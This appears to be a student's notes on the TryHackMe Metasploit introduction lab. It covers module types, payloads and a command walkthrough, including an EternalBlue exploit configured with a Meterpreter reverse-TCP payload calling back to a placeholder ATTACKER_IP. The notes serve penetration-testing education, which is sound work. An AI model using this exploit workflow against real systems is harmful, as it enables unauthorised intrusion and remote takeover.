# TryHackMe - Metasploit Introduction

## Overview
Completed the Metasploit Introduction TryHackMe room, focusing on framework structure, module workflow, payload selection, and practical exploitation methodology.

This room provided foundational understanding of how Metasploit is used during penetration testing engagements.

---

## Skills Practiced

- Metasploit Framework navigation
- Module discovery
- Exploit selection
- Payload selection
- Target configuration
- Session management
- Post-exploitation workflow awareness

---

## Core Concepts

### Vulnerability
A weakness in software, configuration, or design that can be exploited.

---

### Exploit
Code or technique used to leverage a vulnerability.

---

### Payload
Code executed after successful exploitation.

Examples:

- reverse shell
- bind shell
- Meterpreter session

---

## Metasploit Module Types

### Auxiliary
Used for support tasks such as:

- scanning
- enumeration
- brute forcing
- fuzzing

Example:

```bash
auxiliary/scanner/smb/smb_version
```

---

### Exploit
Modules used to actively exploit vulnerabilities.

Example:

```bash
exploit/windows/smb/ms17_010_eternalblue
```

---

### Payload
Code executed after exploitation.

Types:

Single payload:

```bash
shell_reverse_tcp
```

Staged payload:

```bash
shell/reverse_tcp
```

Difference:

- single = entire payload delivered at once
- staged = loader first, full payload later

---

### Post
Used after exploitation.

Examples:

- credential dumping
- privilege escalation
- persistence
- system enumeration

---

### Other Modules

- encoders
- nops
- evasion

Used for payload support and evasion scenarios.

---

## Common Metasploit Workflow

### Launch Framework

```bash
msfconsole
```

---

### Search Modules

```bash
search ms17-010
```

---

### Select Module

```bash
use exploit/windows/smb/ms17_010_eternalblue
```

or:

```bash
use 2
```

---

### Review Options

```bash
show options
```

---

### Review Payloads

```bash
show payloads
```

---

### Configure Target

```bash
set RHOSTS TARGET_IP
set RPORT 445
set LHOST ATTACKER_IP
set LPORT 4444
set PAYLOAD windows/x64/meterpreter/reverse_tcp
```

---

### Execute Exploit

```bash
run
```

or:

```bash
exploit
```

---

### Session Management

List sessions:

```bash
sessions
```

Interact:

```bash
sessions -i 1
```

Meterpreter help:

```bash
help
```

---

## Common Parameters

### RHOSTS
Remote target IP(s).

---

### RPORT
Target service port.

---

### LHOST
Local attacker callback IP.

---

### LPORT
Listener port.

---

### PAYLOAD
Selected post-exploitation payload.

---

### SESSION
Used by post-exploitation modules.

---

## Useful Commands

```bash
help
history
search
use
show options
show payloads
info
back
unset OPTION
unset all
sessions
sessions -i ID
run
exploit
```

---

## Security Lessons Learned

### Framework Awareness
Automation tools accelerate exploitation but still require understanding of:

- vulnerabilities
- networking
- payload behavior
- operational context

---

### Context Matters
Metasploit is context-sensitive.

Always verify:

```bash
show options
```

after switching modules.

---

## Key Takeaways

This room reinforced practical understanding of:

- Metasploit framework structure
- exploit workflow methodology
- payload handling
- session management
- offensive tooling fundamentals
